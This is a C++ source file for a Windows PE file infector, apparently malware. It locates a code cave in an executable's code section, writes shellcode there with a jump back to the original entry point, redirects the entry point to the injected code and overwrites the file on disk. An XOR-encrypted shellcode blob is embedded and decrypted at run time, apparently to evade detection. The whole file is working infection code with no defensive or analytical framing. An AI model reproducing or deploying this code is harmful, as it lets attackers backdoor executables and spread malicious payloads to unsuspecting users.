#include <Windows.h>
#include <fstream> 
#include <iostream>
#include "infectPE_header.h"

using namespace std;



void decrypt_shellcode(const char* shellcode, int length_shellcode){
	length_shellcode = strlen(shellcode);
	recursive_xor_decrypt(CIPHER_CHAR_KEY, (char*)shellcode, length_shellcode);
}

void encrypt_shellcode(const char* shellcode, int length_shellcode) {
	length_shellcode = strlen(shellcode);
	recursive_xor_encrypt(CIPHER_CHAR_KEY, (char*)shellcode, length_shellcode);
}

char* getResponse(State state, char* file_location) {
	switch (state) {
	case Success: {
		return suc_msg;
	}
	case no_open: {
		return noOpen_msg;
	}
	case no_cave: {
		return noCave_msg;
	}
	}
}

DWORD find_codePointRawData(char* data) {
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)data;                       //cast it to DOS header (some calls it MZ header)
	IMAGE_NT_HEADERS* peHeader = (IMAGE_NT_HEADERS *)&data[dosHeader->e_lfanew];  //find NT header (PE header)
	IMAGE_FILE_HEADER* fHeader = &peHeader->FileHeader;
	IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(DWORD(data) + dosHeader->e_lfanew + 248);
	DWORD codePointRawData = SectionHeader->PointerToRawData;
	/*cout << "codePointRawData:";
	cout << hex << codePointRawData;
	cout << endl;*/
	return codePointRawData;
}

DWORD find_finishCodeSection(char* data) {
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)data;                       //cast it to DOS header (some calls it MZ header)
	IMAGE_NT_HEADERS* peHeader = (IMAGE_NT_HEADERS *)&data[dosHeader->e_lfanew];  //find NT header (PE header)
	IMAGE_FILE_HEADER* fHeader = &peHeader->FileHeader;
	IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER(DWORD(data) + dosHeader->e_lfanew + 248);
	DWORD finishCodeSection = SectionHeader->SizeOfRawData + SectionHeader->PointerToRawData;
	/*cout << "finishCodeSection:";
	cout << hex << finishCodeSection;
	cout << endl;*/
	return finishCodeSection;
}

DWORD find_vEntryPoint(char* data) {
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)data;                       //cast it to DOS header (some calls it MZ header)
	IMAGE_NT_HEADERS* peHeader = (IMAGE_NT_HEADERS *)&data[dosHeader->e_lfanew];  //find NT header (PE header)
	IMAGE_FILE_HEADER* fHeader = &peHeader->FileHeader;

	DWORD ep = 0;

	if ((WORD)fHeader->Machine == 0x014c)  //32-bit executable
		ep = ((IMAGE_NT_HEADERS32 *)peHeader)->OptionalHeader.AddressOfEntryPoint;  //Get EP
	else  //64-bit executable
		ep = ((IMAGE_NT_HEADERS64 *)peHeader)->OptionalHeader.AddressOfEntryPoint;  //Get EP

	/*cout << "Entry point:";
	cout << hex << ep;
	cout << endl;*/
	return ep;
}

DWORD find_OffsetRealEntryPoint(char* data) {
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)data;                       //cast it to DOS header (some calls it MZ header)
	IMAGE_NT_HEADERS* peHeader = (IMAGE_NT_HEADERS *)&data[dosHeader->e_lfanew];  //find NT header (PE header)
	IMAGE_FILE_HEADER* fHeader = &peHeader->FileHeader;
	PIMAGE_OPTIONAL_HEADER pOpHeader = (PIMAGE_OPTIONAL_HEADER)&peHeader->OptionalHeader;
	PIMAGE_SECTION_HEADER pImgSecHeadFirst = (PIMAGE_SECTION_HEADER)((BYTE*)peHeader + sizeof(IMAGE_NT_HEADERS)); //+ (fHeader->NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));

	DWORD ep = 0;

	if ((WORD)fHeader->Machine == 0x014c)  //32-bit executable
		ep = ((IMAGE_NT_HEADERS32 *)peHeader)->OptionalHeader.AddressOfEntryPoint;  //Get EP
	else  //64-bit executable
		ep = ((IMAGE_NT_HEADERS64 *)peHeader)->OptionalHeader.AddressOfEntryPoint;  //Get EP

	DWORD RVA = pImgSecHeadFirst->VirtualAddress;
	DWORD Pointer_Raw_Data = pImgSecHeadFirst->PointerToRawData;
	//Offset Real EntryPoint = PointerToRawData_rounded_down + AddressOfEntryPoint - VirtualAddress
	DWORD OffRealEP = Pointer_Raw_Data + ep - RVA;

	/*cout << "Real entry point:";
	cout << hex << OffRealEP;
	cout << endl;*/
	return OffRealEP;
}

DWORD find_baseAddress(char* data) {
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER *)data;                       //cast it to DOS header (some calls it MZ header)
	IMAGE_NT_HEADERS* peHeader = (IMAGE_NT_HEADERS *)&data[dosHeader->e_lfanew];  //find NT header (PE header)
	IMAGE_FILE_HEADER* fHeader = &peHeader->FileHeader;

	DWORD ba = 0;

	if ((WORD)fHeader->Machine == 0x014c)  //32-bit executable
		ba = ((IMAGE_NT_HEADERS32 *)peHeader)->OptionalHeader.BaseOfCode;  //Get EP
	else  //64-bit executable
		ba = ((IMAGE_NT_HEADERS64 *)peHeader)->OptionalHeader.BaseOfCode;  //Get EP
	return ba;
}

int search_in_buffer(char* data, int size_data, DWORD* being_search, int size_being_search) {
	/*cout << "Searching: ";
	cout << hex << *being_search;
	cout << endl;*/
	int i = 0;
	while (size_data > i + size_being_search) {
		if (memcmp((DWORD*)(data + i), being_search, size_being_search) == 0) return i;
		i++;
	}
	return NULL;
}

int find_cave(char* data, int size, int length_shellcode) {
	char* cave = new char[length_shellcode + 1];
	memset(cave, 0x00, length_shellcode);

	int index_cave = search_in_buffer(data, size, (DWORD*)cave, length_shellcode);
	return index_cave;
}

void print_bufferHex(char* data, int size) {
	for (int i = 0; i < size; i++)
	{
		printf("%02X", data[i]);
	}
	cout << endl;
}

char* infectPE_file(LPVOID file_location, const char* shellcode, int length_shellcode) {
	length_shellcode = strlen(shellcode);

	streampos size;
	char* pData;
	char* response;

	ifstream file((char*)file_location, ios::in | ios::binary | ios::ate); //Ate = Comienza al final
	if (file.is_open())
	{
		size = file.tellg();
		pData = new char[size];
		file.seekg(0, ios::beg);
		file.read(pData, size);
		file.close();

		DWORD ep = find_vEntryPoint(pData);//Sacamos AddressOfEntryPoint
		//DWORD ba = find_baseAddress(pData)*2;//Sacamos BaseCode
		DWORD cPtRwD = find_codePointRawData(pData);
		DWORD offRealEP = find_OffsetRealEntryPoint(pData);//Sacamos Offset al EntryPoint Real
		DWORD offDif = ep - offRealEP; //Diferencia entre el AddressOfEntryPoint y el Offset al EntryPoint Real

									   //DWORD ep_rev = reverse(ep);

		int index_ep = search_in_buffer(pData, size, &ep, sizeof(DWORD)); //Encontramos Offset al AddressOfEntryPoint

		int index_cave = 0;
		char* pCave = pData + cPtRwD;// +ba; //Buscamos un cave tan grande como shellcode a partir de BaseCode
		index_cave = find_cave(pCave, size, length_shellcode) + cPtRwD; //+ ba;
		/*cout << "Index cave:";
		cout << hex << index_cave;
		cout << endl;*/
		if (index_cave > find_finishCodeSection(pData) || index_cave == NULL) {
			//cout << "Not possible" << endl;
			response = getResponse(no_cave, (char*)file_location);
			return response;
		}

		//Copy shellcode en el cave encontrado
		pCave = pData + index_cave;
		memcpy(pCave, shellcode, length_shellcode);

		//Add offset de distancia al entry point original
		/*cout << "Length shellcode:";
		cout << hex << length_shellcode;
		cout << endl;*/
		int jumpAddr = offRealEP - index_cave - length_shellcode - 0x4;

		/*cout << "JMP:";
		cout << hex << jumpAddr;
		cout << endl;*/

		memcpy(pCave + length_shellcode, &jumpAddr, sizeof(int));

		//print_bufferHex(pCave, length_shellcode+4);

		//Change AddressOfEntryPoint to pCave + Offset al cargarse
		pCave = pData + index_ep; //pAddressOfEntryPoint value
		int RealOffCave = index_cave + offDif;//Apunta a donde se cargará la shellcode
		memcpy(pCave, (DWORD*)&RealOffCave, sizeof(DWORD));
		ep = find_vEntryPoint(pData);

		//print_bufferHex(pData, size);

		ofstream outFile((char*)file_location, ios::out | ios::binary);
		outFile.write(pData, size);
		outFile.close();

		delete[] pData;
	}
	else {
		//cout << "Unable to open file";
		response = getResponse(no_open, (char*)file_location);
		return response;
	}

	response = getResponse(Success, (char*)file_location);
	return response;

	//std::ofstream data;
	//data.open("test.txt", std::ofstream::out | std::ofstream::app);
}

char* infect_main(LPVOID file_location, BOOL use_shell_detected, const char* shellcode) {
	char* response;
	int length_shellcode;
	if (use_shell_detected) {
		const char shellcode_detected[] = "\x43\x8A\xEE\x65\x24\x14\x9F\xDF\xD3\x58\x28\x3C\x91\x07\xAA\x21\x79\x69\xE2\xB1\x8D\x8E\x5D\xD6\x84\xFC\xFF\x2C\xA7\xD5\xF5\xF6";
		length_shellcode = strlen(shellcode_detected);
		decrypt_shellcode(shellcode_detected, length_shellcode);
		response = infectPE_file(file_location, shellcode_detected, length_shellcode);
		encrypt_shellcode(shellcode_detected, length_shellcode);
	}
	else {
		length_shellcode = strlen(shellcode);
		response = infectPE_file(file_location, shellcode, length_shellcode);
	}
	return response;
}